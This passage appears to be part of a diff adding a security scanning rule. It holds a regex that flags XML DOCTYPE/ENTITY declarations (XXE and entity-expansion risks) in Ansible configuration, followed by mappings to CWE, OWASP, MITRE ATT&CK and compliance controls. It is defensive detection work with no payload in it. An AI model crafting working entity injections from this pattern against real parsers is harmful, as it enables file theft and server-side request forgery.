'<!DOCTYPE\\s+\\S+\\s*\\[[^]]*<!ENTITY' /etc/ansible/` - any match requires security review before deployment."
+    cwe: ['CWE-611', 'CWE-776', 'CWE-918']
+    owasp_appsec: ["A05:2021", "A10:2021"]
+    mitre_attack: ['T1059', 'T1083', 'T1190']
+    cis_controls: ['CIS-16.1', 'CIS-16.6', 'CIS-16.11']
+    nist_controls: ['SC-18', 'SI-10', 'SI-10(5)']
+    pci_dss: ['6.2.4', '6.3.3']
+    hipaa: ['164.312(c)(1)']
+    soc2: ['CC7.1', 'CC7.2']
